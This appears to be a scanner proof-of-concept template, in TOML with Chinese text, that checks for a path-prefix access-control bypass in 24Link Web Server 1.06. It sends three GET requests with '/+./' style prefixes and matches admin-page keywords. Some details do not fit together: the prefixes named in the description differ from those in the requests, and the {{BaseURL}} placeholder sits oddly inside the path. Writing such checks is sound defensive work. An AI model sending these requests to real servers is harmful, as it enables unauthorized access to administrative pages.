[info]
author = "ave"
description = "利用 24Link Web Server 1.06 的路径规范化缺陷，通过在 HTTP GET 请求路径中添加特殊前缀（如'/+/' 或'/.'）来绕过访问控制验证。攻击者无需权限即可直接访问受保护的资源。"
id = "POC-AVE-2000-1094"
name = "24Link Web Server 路径穿越漏洞 PoC"
severity = "high"
tags = ["ave-2000-1094"]
vuln_id = [
    "CVE-2000-1118",
    "AVE-2000-1094",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "管理",
    "admin",
    "账号",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/+./admin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "管理",
    "admin",
    "账号",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/+/+admin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "管理",
    "admin",
    "账号",
]
